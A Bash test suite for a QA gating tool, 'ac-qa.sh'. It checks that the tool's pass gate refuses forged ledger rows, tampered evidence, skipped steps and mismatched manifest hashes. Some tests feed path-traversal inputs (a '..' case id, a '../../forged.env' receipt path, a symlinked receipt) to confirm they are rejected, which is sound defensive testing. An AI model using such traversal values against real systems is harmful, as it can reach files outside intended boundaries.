out="$("$QA" finish passed 2>&1)" && fail "an undecided ask-user finding must block pass: $out"
assert_contains "$out" "HF-1" "the finding refusal names its id"
printf '%s' '[{"id":"HF-1","severity":"warning","action":"ask-user",
               "description":"choose the accepted oracle",
               "decision":"captain accepted the specification"}]' \
  | "$QA" findings cases >/dev/null
assert_contains "$("$QA" finish passed)" "QA_VERDICT=passed" \
  "a decided ask-user finding no longer blocks a complete run"
cd "$repo" || fail "cd back from qahard"

# --- watch pane: the dashboard is embedded as an ABSOLUTE path ------------------
# The pane is created with --cwd "$repo", a DIFFERENT directory than the
# caller's, so a caller-relative "$(dirname "$0")" reaches the pane as a path
# that does not resolve there. `binlink` reproduces a chief's relative
# `bin/ac-qa.sh` invocation; the composed line must still name the board
# absolutely. The stub LOGS the pane-run line instead of executing it - the
# dashboard is an endless refresh loop.
export QHLOG="$TMP/qa-herdr.log"
cat >"$TMP/stub/herdr" <<'EOF'
#!/usr/bin/env bash
echo "herdr $*" >>"$QHLOG"
[ "${1:-}" = --session ] && shift 2
case "${1:-} ${2:-}" in
  "pane list") echo '{"result":{"panes":[]}}' ;;
  "workspace list") echo '{"result":{"workspaces":[]}}' ;;
  "workspace create") echo '{"result":{"workspace":{"workspace_id":"wQ"}}}' ;;
  "tab create") echo '{"result":{"tab":{"tab_id":"tQ"},"root_pane":{"pane_id":"pQ1"}}}' ;;
esac
exit 0
EOF
chmod +x "$TMP/stub/herdr"
wqrepo="$(make_repo qawatchrepo)"
ln -s "$BIN" "$wqrepo/binlink"
cd "$wqrepo" || fail "cd qawatchrepo"
AC_QA_WATCH=auto binlink/ac-qa.sh start --target HEAD --task watchpath >/dev/null 2>&1
assert_contains "$(cat "$QHLOG")" "ac-qa-watch.sh" "watch board launched"
qsp="$(sed -n "s/.*'\([^']*ac-qa-watch\.sh\)'.*/\1/p" "$QHLOG" | head -1)"
case "$qsp" in /*) ;; *) fail "watch board must be absolute in the pane command, got '$qsp'" ;; esac
cd "$repo" || fail "cd back from qawatchrepo"

# --- watch pane ops DEGRADE, never abort `start` (F26) ------------------------
# ac-ship.sh's watch_open already guards its rename/run with `|| true` (the
# tab is already open by then, so a failure there must cost the DASHBOARD,
# never the run) - this same idiom in ac-qa.sh ran those two calls unguarded
# under the script's own `set -euo pipefail`, a live start-abort hazard once
# the two copies drifted apart.
gstub="$TMP/qapaneopstub"; mkdir -p "$gstub"
cat >"$gstub/herdr" <<'EOF'
#!/usr/bin/env bash
echo "herdr $*" >>"$WHLOG"
[ "${1:-}" = --session ] && shift 2
case "${1:-} ${2:-}" in
  "pane list") echo '{"result":{"panes":[]}}' ;;
  "workspace get") exit 1 ;;
  "workspace list") echo '{"result":{"workspaces":[]}}' ;;
  "workspace create") echo '{"result":{"workspace":{"workspace_id":"wW"}}}' ;;
  "tab create") echo '{"result":{"tab":{"tab_id":"tW"},"root_pane":{"pane_id":"pW1"}}}' ;;
  "pane rename"|"pane run") exit 1 ;;
esac
exit 0
EOF
chmod +x "$gstub/herdr"
qprepo="$(make_repo qapaneopsrepo)"
cd "$qprepo" || fail "cd qapaneopsrepo"
export WHLOG="$TMP/qa-paneops.log"
: >"$WHLOG"
rc=0
out="$(PATH="$gstub:$PATH" AC_QA_WATCH=auto "$QA" start --target HEAD --task paneopsfail 2>&1)" || rc=$?
[ "$rc" -eq 0 ] || fail "qa start must survive failing watch pane ops, got rc=$rc: $out"
qprun="$qprepo/.crew/qa/$(readlink "$qprepo/.crew/qa/current")"
assert_eq "$(cat "$qprun/watch.pane")" "pW1" "the opened pane is still recorded so finish can retire it"
cd "$repo" || fail "cd back from qapaneopsrepo"

# --- completion gate negatives: grade / evidence root / web visual ----------------
# One pass-shaped run, then break exactly one per-case guard at a time: the
# gate must refuse each and NAME the offending case, never fall through to a
# later guard's message.
printf 'gate-neg\n' >"$repo/gateneg.txt"
git -C "$repo" add -A && git -C "$repo" -c user.email=t@t -c user.name=t commit -qm gateneg
sha_gn="$(git -C "$repo" rev-parse HEAD)"
"$QA" start --target "$sha_gn" --task gate-neg >/dev/null
rdgn="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
mk_png "$TMP/gneg.png"
"$QA" visual "$TMP/gneg.png" >/dev/null
qa_case NG-1 pass api --evidence "$(case_evidence NG-1)" >/dev/null
prepare_pass
out="$("$QA" finish passed 2>&1)" && fail "a gradeless passing case must refuse the pass"
assert_contains "$out" "NG-1" "the grade refusal names the case"
ng1_ev="$(awk -F'\t' '$1=="NG-1"{print $7}' "$rdgn/cases.tsv")"
awk -F'\t' -v OFS='\t' '$1=="NG-1"{$6="A";$7="-"}{print}' \
  "$rdgn/cases.tsv" >"$rdgn/c.t" && mv "$rdgn/c.t" "$rdgn/cases.tsv"
out="$("$QA" finish passed 2>&1)" && fail "a placeholder evidence path must refuse the pass"
assert_contains "$out" "NG-1" "the placeholder-evidence refusal names the case"
printf 'outside the declared root\n' >"$TMP/outside-ev.txt"
awk -F'\t' -v OFS='\t' -v p="$TMP/outside-ev.txt" '$1=="NG-1"{$7=p}{print}' \
  "$rdgn/cases.tsv" >"$rdgn/c.t" && mv "$rdgn/c.t" "$rdgn/cases.tsv"
out="$("$QA" finish passed 2>&1)" && fail "an out-of-root evidence path must refuse the pass"
assert_contains "$out" "NG-1" "the out-of-root refusal names the case"
awk -F'\t' -v OFS='\t' -v p="$ng1_ev" '$1=="NG-1"{$7=p}{print}' \
  "$rdgn/cases.tsv" >"$rdgn/c.t" && mv "$rdgn/c.t" "$rdgn/cases.tsv"
qa_case WEB-1 pass web --grade B --evidence "$(case_evidence WEB-1)" >/dev/null
# The browser boundary registers its own screenshot; drop that link to probe the
# gate that a web case OWES a valid visual of its own.
awk -F'\t' '$4 != "WEB-1"' "$rdgn/visuals.tsv" >"$rdgn/v.t" && mv "$rdgn/v.t" "$rdgn/visuals.tsv"
out="$("$QA" finish passed 2>&1)" && fail "a web case with no linked visual must refuse the pass"
assert_contains "$out" "WEB-1" "the web-visual refusal names the case"
mk_png "$TMP/gneg2.png"
"$QA" visual "$TMP/gneg2.png" --case WEB-1 >/dev/null
assert_contains "$("$QA" finish passed)" "QA_VERDICT=passed" \
  "valid grade + rooted evidence + linked web visual open the gate"

# --- a skipped testplan cannot pass, and the refusal names the skip ---------------
"$QA" start --target "$sha_gn" --task tp-skip >/dev/null
mk_png "$TMP/tps.png"
qa_case TP-1 pass api --grade A --evidence "$(case_evidence TP-1)" >/dev/null
"$QA" visual "$TMP/tps.png" --case TP-1 >/dev/null
"$QA" step testplan skipped --note 'probing the gate' >/dev/null
stage_ship_receipt
"$QA" baseline >/dev/null
for s in pin infra cases verdict; do "$QA" step "$s" completed >/dev/null; done
"$QA" step e2e skipped --note 'no full-path case' >/dev/null
"$QA" step evidence skipped --note 'registered directly' >/dev/null
out="$("$QA" finish passed 2>&1)" && fail "a skipped testplan must not pass"
assert_contains "$out" "completed testplan step" \
  "the refusal names the skipped testplan, not a missing frozen hash"
"$QA" finish cancelled >/dev/null

# --- step --note: awk escapes never reintroduce the scrubbed control chars --------
# The scrub removes REAL tabs/newlines; the ledger rewrite must not let a
# literal backslash-t/backslash-n in the note re-become one inside awk.
"$QA" start --target "$sha_gn" --task note-esc >/dev/null
rdne="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
"$QA" step serve skipped --note 'see C:\temp\notes and D:\next for context' >/dev/null
assert_eq "$(awk -F'\t' '$1=="serve"{print NF}' "$rdne/steps.tsv")" "4" \
  "a backslash-t note stays one column"
assert_eq "$(wc -l <"$rdne/steps.tsv" | tr -d ' ')" "9" \
  "a backslash-n note injects no phantom ledger row"
assert_contains "$(awk -F'\t' '$1=="serve"{print $4}' "$rdne/steps.tsv")" 'C:\temp\notes' \
  "the literal backslash text survives verbatim"
"$QA" finish cancelled >/dev/null

# =================================================================================
# QA BOUNDARY POLICY (captain 2026-07-25): QA evidence comes only from the client
# boundaries of the BOOTED deliverable; QA never runs or re-runs a unit suite.
# =================================================================================
bp_repo="$(make_repo bpolicy)"
printf 'qa:\n  serve: "echo bp-serve; sleep 30"\n  health: "true"\n  health_timeout: 5\n' \
  >"$AC_HOME/projects/bpolicy.yaml"
cd "$bp_repo" || fail "cd bpolicy"
bp_sha="$(git -C "$bp_repo" rev-parse HEAD)"

# --- coverage ladder: freeze precedes cases, and QA never executes unit ----------
"$QA" start --target "$bp_sha" --task bp-tiers >/dev/null
bprd="$(qa_run_path)"
boot_runtime
preplan_ev="$(case_evidence PREPLAN-1)"
out="$("$QA" boundary-run --case PREPLAN-1 --boundary http \
  --evidence "$preplan_ev" -- true 2>&1)" \
  && fail "boundary execution before the frozen coverage manifest must refuse"
assert_contains "$out" "completed testplan" \
  "the pre-execution refusal names the missing frozen testplan"
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA test plan

## Coverage
coverage: AC-workflow | it | - | W-1

## Full Flow
full-flow: W-1
EOF
"$QA" step testplan completed >/dev/null
early_ev="$(case_evidence W-EARLY)"
"$QA" boundary-run --case W-EARLY --boundary workflow \
  --evidence "$early_ev" -- true >/dev/null 2>&1
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA test plan

## Coverage
coverage: AC-workflow | it | - | W-1
coverage: AC-extra | it | - | W-EARLY

## Full Flow
full-flow: W-1
EOF
out="$("$QA" testplan-amend --case W-EARLY \
  --authority 'accepted specification' --reason 'attempt selection change' 2>&1)" \
  && fail "a boundary receipt must freeze coverage before its case row exists"
assert_contains "$out" "start a fresh QA round" \
  "boundary evidence alone freezes the selected manifest"
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA test plan

## Coverage
coverage: AC-workflow | it | - | W-1

## Full Flow
full-flow: W-1
EOF
qa_case W-1 pass workflow --grade A >/dev/null
assert_eq "$(awk -F'\t' '$1=="W-1"{print $2"/"$11}' "$bprd/cases.tsv")" "workflow/workflow" \
  "the workflow tier records with its own boundary"
out="$("$QA" case U-1 unverifiable --tier unit --note 'unit belongs to ship' 2>&1)" \
  && fail "QA must refuse the unit case tier"
assert_contains "$out" "--tier must be one of: api db workflow web" \
  "the unit-tier refusal names the closed QA execution set"
out="$("$QA" boundary-run --case U-2 --boundary unit --evidence "$preplan_ev" -- true 2>&1)" \
  && fail "QA must refuse the unit execution boundary"
assert_contains "$out" "http|grpc|client-cli|workflow|queue|schedule" \
  "the unit-boundary refusal names only live client/integration boundaries"

# --- 3. owned transitions: baseline and serve are published, never typed --------
out="$("$QA" step baseline completed 2>&1)" && fail "a direct baseline completion must refuse"
assert_contains "$out" "'ac-qa.sh baseline' owns this transition" "the refusal names the owner"
out="$("$QA" step baseline skipped --note x 2>&1)" && fail "a direct baseline skip must refuse too"
out="$("$QA" step serve completed 2>&1)" && fail "a direct serve completion must refuse"
assert_contains "$out" "'ac-qa.sh serve' owns this transition" "the refusal names the owner"
assert_eq "$(awk -F'\t' '$1=="serve"{print $2}' "$bprd/steps.tsv")" "completed" \
  "the OWNING command already recorded the boot"
# `health` publishes the runtime receipt and owns NO step of its own.
assert_file "$bprd/runtime/receipt.env" "health publishes the runtime boot receipt"
assert_eq "$(ac_meta_read "$bprd/runtime/receipt.env" schema)" "agentcrew.qa-runtime-receipt/v1" \
  "the boot receipt carries the closed schema"
assert_eq "$(ac_meta_read "$bprd/runtime/receipt.env" source_sha)" "$bp_sha" \
  "the boot receipt binds the exact source"

# --- 5. boundary receipts are path-closed and re-checked at the gate ------------
bp_ev="$(case_evidence X-1)"
bp_receipt="$("$QA" boundary-run --case X-1 --boundary http --evidence "$bp_ev" -- true 2>/dev/null)"
assert_contains "$bp_receipt" "$bprd/boundaries/X-1/" "the receipt lands under the run's own case dir"
assert_eq "$(ac_meta_read "$bp_receipt" runtime_receipt_sha256)" \
  "$(shasum -a 256 <"$bprd/runtime/receipt.env" | awk '{print $1}')" \
  "the boundary receipt hash-binds the runtime it exercised"
# A receipt minted for ANOTHER case cannot be borrowed.
out="$("$QA" case X-2 pass --tier api --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bp_receipt" 2>&1)" && fail "a borrowed receipt must refuse"
assert_contains "$out" "boundaries/X-2/" "the refusal names the case's own receipt directory"
# ...and an incoherent tier/boundary pair is refused by the closed table.
out="$("$QA" case X-1 pass --tier web --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bp_receipt" 2>&1)" && fail "web cannot be satisfied by http"
assert_contains "$out" "cannot be satisfied by boundary" "the refusal names the incoherent pair"
"$QA" case X-1 pass --tier api --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bp_receipt" >/dev/null
# A pass row cannot bind a NON-ZERO execution.
bad_receipt="$("$QA" boundary-run --case X-3 --boundary http --evidence "$bp_ev" -- false 2>/dev/null || true)"
assert_eq "$(ac_meta_read "$bad_receipt" exit_code)" "1" "a failed driver still publishes its receipt"
out="$("$QA" case X-3 pass --tier api --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bad_receipt" 2>&1)" && fail "a pass cannot bind a non-zero execution"
"$QA" case X-3 fail --tier api --classification flaky --evidence "$bp_ev" \
  --boundary http --receipt "$bad_receipt" >/dev/null
assert_eq "$(awk -F'\t' '$1=="X-3"{print $3}' "$bprd/cases.tsv")" "fail" \
  "a fail row may bind a non-zero execution"
# Path closure is CANONICAL, not textual: a dot-dot case id, a traversal
# receipt path, and a symlinked receipt are all refused.
assert_fails "$QA" boundary-run --case 'x..y' --boundary http --evidence "$bp_ev" -- true
assert_fails "$QA" boundary-run --case '..' --boundary http --evidence "$bp_ev" -- true
cp "$bp_receipt" "$bprd/forged.env"
out="$("$QA" case X-1 pass --tier api --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bprd/boundaries/X-1/../../forged.env" 2>&1)" \
  && fail "a traversal receipt path must refuse"
assert_contains "$out" "traversal" "the refusal names the canonical closure"
ln -s "$bprd/forged.env" "$bprd/boundaries/X-1/link.env"
assert_fails "$QA" case X-1 pass --tier api --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bprd/boundaries/X-1/link.env"
rm -f "$bprd/boundaries/X-1/link.env" "$bprd/forged.env"
# Tampered evidence: the receipt's registered artifact is re-hashed at record
# time (and again at the gate), so an artifact edited after publication is
# not the artifact the receipt vouched for.
printf 'tampered after publication\n' >"$bp_ev"
out="$("$QA" case X-1 pass --tier api --grade A --evidence "$bp_ev" \
  --boundary http --receipt "$bp_receipt" 2>&1)" && fail "tampered evidence must refuse"
assert_contains "$out" "no longer matches the artifact" "the refusal names the tamper"
"$QA" finish cancelled >/dev/null

# --- UT is conditional ship evidence, never a QA execution tier ----------------
"$QA" start --target "$bp_sha" --task bp-ut-good >/dev/null
utrd="$(qa_run_path)"
stage_ship_receipt
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA plan with reused UT evidence

## Coverage
coverage: AC-UT | ut | file.txt#direct_case | -
coverage: assembled-flow | it | - | UT-FLOW

## Full Flow
full-flow: UT-FLOW
EOF
"$QA" step testplan completed >/dev/null
assert_eq "$(jq -r '.coverage[] | select(.rung=="ut") | .case' "$utrd/testplan-manifest.json")" \
  "-" "a UT mapping freezes a test reference and creates no QA case"
assert_eq "$(wc -l <"$utrd/cases.tsv" | tr -d ' ')" "0" \
  "freezing UT coverage does not execute or register a case"
"$QA" finish cancelled >/dev/null

"$QA" start --target "$bp_sha" --task bp-ut-missing >/dev/null
utbad="$(qa_run_path)"
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA plan with unavailable UT evidence

## Coverage
coverage: AC-UT | ut | file.txt#direct_case | -
coverage: assembled-flow | it | - | UT-FLOW

## Full Flow
full-flow: UT-FLOW
EOF
out="$("$QA" step testplan completed 2>&1)" \
  && fail "a UT mapping without a qualifying exact-SHA ship receipt must refuse"
assert_contains "$out" "map the affected AC to IT instead" \
  "the UT refusal directs coverage escalation without running tests"
assert_no_file "$utbad/testplan-manifest.json" \
  "an invalid UT mapping publishes no partial manifest"
assert_eq "$(awk -F'\t' '$1=="testplan"{print $2}' "$utbad/steps.tsv")" "pending" \
  "an invalid UT mapping leaves the testplan step pending"
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA plan escalated to integration coverage

## Coverage
coverage: AC-UT | it | - | UT-FLOW

## Full Flow
full-flow: UT-FLOW
EOF
"$QA" step testplan completed >/dev/null
assert_file "$utbad/testplan-manifest.json" \
  "a plan with no UT row does not make the ship receipt a global gate"
"$QA" finish cancelled >/dev/null

# --- 4 + 9: the pass gate needs a booted runtime AND a qualifying ship receipt ---
"$QA" start --target "$bp_sha" --task bp-gate >/dev/null
gprd="$(qa_run_path)"
# 9a: with no frozen ship receipt at all, baseline completes the CHECK with an
# informational note - no suite run, NO finding, and nothing gated (captain
# 2026-07-25: QA adjudicates its pass on its own boundary evidence only).
out="$("$QA" baseline)"
assert_contains "$out" "not-qualifies:absent" "an absent ship receipt is named, not re-run"
assert_contains "$out" "UT coverage requires qualification" \
  "baseline states the conditional receipt contract without rerunning tests"
assert_eq "$(awk -F'\t' '$1=="baseline"{print $2}' "$gprd/steps.tsv")" "completed" \
  "the CHECK completes in both directions"
assert_no_file "$gprd/findings/baseline.json" "an unqualified receipt files NO finding"
# 9b: a qualifying receipt refreshes the informational note.
stage_ship_receipt
"$QA" baseline >/dev/null
assert_contains "$(awk -F'\t' '$1=="baseline"{print $4}' "$gprd/steps.tsv")" "qualifies:executed" \
  "the frozen qualifying receipt is recorded as the baseline answer"
# 9c: the pass is DECOUPLED from the receipt: remove it again and the round
# still passes on its own boundary evidence below.
rm -f "$gprd/profile/ship/test-receipt.env"
"$QA" baseline >/dev/null
assert_contains "$(awk -F'\t' '$1=="baseline"{print $4}' "$gprd/steps.tsv")" "not-qualifies:absent" \
  "the informational note follows the receipt state"
qa_case GP-1 pass api --grade A >/dev/null
mk_png "$TMP/bp.png"
"$QA" visual "$TMP/bp.png" --case GP-1 >/dev/null
terminalize_steps
# The GATE re-hashes each passing case's registered artifact too: evidence
# edited between record time and finish is refused, and restoring the exact
# bytes lets the same round pass.
gp1_ev="$("$QA" evidence-dir)/cases/GP-1/result.txt"
cp "$gp1_ev" "$TMP/gp1-ev.orig"
printf 'tampered between record and finish\n' >"$gp1_ev"
out="$("$QA" finish passed 2>&1)" && fail "gate must refuse evidence tampered after record"
assert_contains "$out" "no longer matches the artifact" "the gate refusal names the tamper"
cp "$TMP/gp1-ev.orig" "$gp1_ev"
"$QA" finish passed >/dev/null
assert_file "$gprd/runtime/gate.current" "the pass publishes a final runtime gate receipt"
gate_file="$gprd/runtime/gates/$(cat "$gprd/runtime/gate.current")"
assert_eq "$(ac_meta_read "$gate_file" schema)" "agentcrew.qa-runtime-gate/v1" "the gate receipt schema"
assert_eq "$(ac_meta_read "$gate_file" runtime_receipt_sha256)" \
  "$(shasum -a 256 <"$gprd/runtime/receipt.env" | awk '{print $1}')" \
  "the gate binds the boot receipt it re-proved"

# --- the declared full-flow group is mechanically last -------------------------
"$QA" start --target "$bp_sha" --task bp-order >/dev/null
ordrd="$(qa_run_path)"
qa_case ORD-COMP pass api --grade A >/dev/null
mk_png "$TMP/order.png"
"$QA" visual "$TMP/order.png" --case ORD-COMP >/dev/null
terminalize_steps
cp "$ordrd/testplan-manifest.json" "$TMP/order-manifest.json"
jq '.full_flow += ["FORGED"]' "$TMP/order-manifest.json" \
  >"$ordrd/testplan-manifest.json"
out="$("$QA" finish passed 2>&1)" \
  && fail "a manifest that disagrees with the current plan must refuse"
assert_contains "$out" "current test plan disagrees with the frozen manifest" \
  "the pass gate re-renders rather than trusting stored manifest JSON"
cp "$TMP/order-manifest.json" "$ordrd/testplan-manifest.json"
cp "$ordrd/run.meta" "$TMP/order-run.meta"
sed -i.bak 's/^testplan_manifest_sha256=.*/testplan_manifest_sha256=WRONG/' \
  "$ordrd/run.meta"
out="$("$QA" finish passed 2>&1)" \
  && fail "a manifest hash that disagrees with run.meta must refuse"
assert_contains "$out" "frozen manifest hash mismatch" \
  "the pass gate binds the canonical manifest bytes to run.meta"
cp "$TMP/order-run.meta" "$ordrd/run.meta"
component_receipt="$(awk -F'\t' '$1=="ORD-COMP"{print $12}' "$ordrd/cases.tsv")"
cp "$component_receipt" "$TMP/order-component.env"
sed -i.bak \
  -e 's/^started_at=.*/started_at=2099-01-01T00:00:00Z/' \
  -e 's/^completed_at=.*/completed_at=2000-01-01T00:00:00Z/' \
  "$component_receipt"
out="$("$QA" finish passed 2>&1)" \
  && fail "a receipt that completes before it starts must refuse"
assert_contains "$out" "completed_at precedes started_at" \
  "the ordering gate rejects an internally impossible receipt chronology"
cp "$TMP/order-component.env" "$component_receipt"
old_flow_receipt="$(awk -F'\t' '$1=="FF-DEFAULT"{print $12}' "$ordrd/cases.tsv")"
sed -i.bak \
  -e 's/^started_at=.*/started_at=2000-01-01T00:00:00Z/' \
  -e 's/^completed_at=.*/completed_at=2000-01-01T00:00:01Z/' \
  "$old_flow_receipt"
late_ev="$(case_evidence ORD-LATE)"
late_receipt="$("$QA" boundary-run --case ORD-LATE --boundary http \
  --evidence "$late_ev" -- true 2>/dev/null)"
"$QA" case ORD-LATE pass --tier api --grade A --evidence "$late_ev" \
  --boundary http --receipt "$late_receipt" >/dev/null
out="$("$QA" finish passed 2>&1)" \
  && fail "a component case recorded after the full-flow group must refuse"
assert_contains "$out" "full-flow final group started before all component cases completed" \
  "the ordering refusal names the effective receipt chronology"
qa_case FF-DEFAULT pass api --grade A >/dev/null
assert_contains "$("$QA" finish passed)" "QA_VERDICT=passed" \
  "re-running the declared full-flow case last satisfies the ordering gate"

# --- 4b: a SKIPPED serve can never satisfy a pass, but stays recordable ---------
"$QA" start --target "$bp_sha" --task bp-noserve >/dev/null
nsrd="$(qa_run_path)"
"$QA" step serve skipped --note 'no reachable boundary in this probe' >/dev/null
stage_ship_receipt
"$QA" baseline >/dev/null
for s in pin infra cases verdict; do "$QA" step "$s" completed >/dev/null; done
ensure_default_testplan
"$QA" step e2e skipped --note 'probe' >/dev/null
"$QA" step evidence skipped --note 'probe' >/dev/null
out="$("$QA" finish passed 2>&1)" && fail "a skipped serve must never pass"
assert_contains "$out" "must boot the deliverable" "the refusal names the un-booted runtime"
# 11: the honest outcomes stay recordable with skipped runtime steps.
assert_contains "$("$QA" finish unverifiable)" "QA_VERDICT=unverifiable" \
  "a run that could not boot still finishes honestly"

# --- 4c: a forged ledger row is refused by the same check that admits an honest one
"$QA" start --target "$bp_sha" --task bp-forge >/dev/null
frd="$(qa_run_path)"
qa_case FG-1 pass api --grade A >/dev/null
mk_png "$TMP/forge.png"
"$QA" visual "$TMP/forge.png" --case FG-1 >/dev/null
stage_ship_receipt
terminalize_steps
# a hand-written row with an UNKNOWN tier cannot pass...
printf 'FG-U\tintegration\tpass\t-\thigh\tA\t%s\tforged\t-\t-\thttp\t%s\n' \
  "$(awk -F'\t' '$1=="FG-1"{print $7}' "$frd/cases.tsv")" \
  "$(awk -F'\t' '$1=="FG-1"{print $12}' "$frd/cases.tsv")" >>"$frd/cases.tsv"
out="$("$QA" finish passed 2>&1)" && fail "a forged unknown-tier row must refuse the pass"
assert_contains "$out" "invalid tier 'integration'" "the finish gate refuses an unknown tier"
awk -F'\t' '$1 != "FG-U"' "$frd/cases.tsv" >"$frd/c.t" && mv "$frd/c.t" "$frd/cases.tsv"
# ...and neither can a row whose receipt column is blanked out.
awk -F'\t' -v OFS='\t' '$1=="FG-1"{$12="-"}{print}' "$frd/cases.tsv" >"$frd/c.t" \
  && mv "$frd/c.t" "$frd/cases.tsv"
out="$("$QA" finish passed 2>&1)" && fail "a row with no boundary receipt must refuse the pass"
assert_contains "$out" "binds no client-boundary execution receipt" "the gate names the missing proof"
"$QA" finish cancelled >/dev/null

# --- 5b: a browser boundary registers BEFORE its final case row exists ----------
"$QA" start --target "$bp_sha" --task bp-web >/dev/null
wrd="$(qa_run_path)"
boot_runtime
ensure_default_testplan
web_ev="$(case_evidence WB-1)"
mk_png "$TMP/wb.png"
web_receipt="$("$QA" boundary-register --case WB-1 --boundary web \
  --transcript "$web_ev" --visual "$TMP/wb.png")"
assert_eq "$(awk -F'\t' '$4=="WB-1"' "$wrd/visuals.tsv" | wc -l | tr -d ' ')" "1" \
  "the browser registration links its visual with no case row on file yet"
assert_eq "$(ac_meta_read "$web_receipt" driver)" "browser" "a web boundary is browser-driven"
"$QA" case WB-1 pass --tier web --grade A --evidence "$web_ev" \
  --boundary web --receipt "$web_receipt" >/dev/null
stage_ship_receipt
terminalize_steps
assert_contains "$("$QA" finish passed)" "QA_VERDICT=passed" \
  "a browser boundary registered before its row still opens the gate"

# --- 6: the E2E wrapper binds the existing immutable receipt --------------------
printf 'qa:\n  serve: "echo bp-serve; sleep 30"\n  health: "true"\n  health_timeout: 5\n  e2e:\n    command: "true"\n' \
  >"$AC_HOME/projects/bpolicy.yaml"
"$QA" start --target "$bp_sha" --task bp-e2e >/dev/null
erd="$(qa_run_path)"
boot_runtime
cat >"$(dirname "$("$QA" evidence-dir)")/testplan.md" <<'EOF'
# QA E2E test plan

## Coverage
coverage: AC-EW-1 | e2e | - | EW-1

## Full Flow
full-flow: EW-1
EOF
"$QA" step testplan completed >/dev/null
# The ledger-first contract: a provisional row, then the execution, then the
# runtime-bound wrapper, then the final row.
"$QA" case EW-1 unverifiable --tier api --note 'pending-e2e-execution' >/dev/null
"$QA" cmd e2e --cases EW-1 >/dev/null
up_receipt="$erd/e2e/receipts/$(cat "$erd/e2e/receipt.current")"
e2e_ev="$(case_evidence EW-1)"
out="$("$QA" boundary-register --case EW-2 --boundary e2e \
  --upstream-receipt "$up_receipt" --evidence "$e2e_ev" 2>&1)" \
  && fail "the wrapper must refuse a case the upstream receipt does not name"
assert_contains "$out" "does not name case EW-2" "the refusal names the unlisted case"
wrap="$("$QA" boundary-register --case EW-1 --boundary e2e \
  --upstream-receipt "$up_receipt" --evidence "$e2e_ev")"
assert_eq "$(ac_meta_read "$wrap" upstream_receipt_sha256)" \
  "$(shasum -a 256 <"$up_receipt" | awk '{print $1}')" "the wrapper binds the upstream receipt"
"$QA" case EW-1 pass --tier api --grade A --evidence "$e2e_ev" \
  --boundary e2e --receipt "$wrap" >/dev/null
mk_png "$TMP/e2e.png"
"$QA" visual "$TMP/e2e.png" --case EW-1 >/dev/null
stage_ship_receipt
"$QA" baseline >/dev/null
for s in pin infra cases verdict; do "$QA" step "$s" completed >/dev/null; done
"$QA" step evidence skipped --note 'registered directly' >/dev/null
assert_contains "$("$QA" finish passed)" "QA_VERDICT=passed" \
  "a wrapped E2E case opens the gate"

# --- 10: no managed ac-qa.sh path ever invokes the ship test command ------------
case "$(grep -c 'commands\.test' "$BIN/ac-qa.sh" || true)" in
  0) ;;
  *) fail "ac-qa.sh must never reference commands.test - QA reads the ship RECEIPT" ;;
esac

cd "$repo" || fail "cd back from bpolicy"

pass
